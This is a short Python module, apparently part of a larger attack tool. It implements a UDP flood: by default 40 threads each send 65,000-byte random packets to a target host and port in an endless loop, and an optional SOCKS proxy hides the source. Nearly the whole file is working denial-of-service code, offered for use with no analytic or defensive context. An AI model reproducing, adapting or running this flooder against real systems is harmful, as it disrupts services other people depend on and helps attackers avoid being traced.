
import socket
import threading
import random
from .sniff import isIP
Max=200000
byte=random._urandom(65000)
c=0
def set_agent(p,socks):#设置代理
    global proxy
    proxy=p
    socket.socket = socks.socksocket
class exp:
    def sent(self):
        global c
        for s in range(1,Max+1):
            sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            while True:
                sock.sendto(byte,(self.host,self.port))
                c=c+1
                print(f'\033[94m{c}\033[1;37;40m times send 65000 bytes to {self.host}:{self.port}')
        return None
    def __init__(self,host:str,port:str,thread=40):
        if not isIP(host):
            print("连接错误")
            exit()
        self.host=host
        self.port=port
       
        junjun=[]
        for i in range(1,thread+1):
            send=threading.Thread(target=self.sent,args=())
            junjun.append(send)
        for i in junjun:
            i.start()
        return None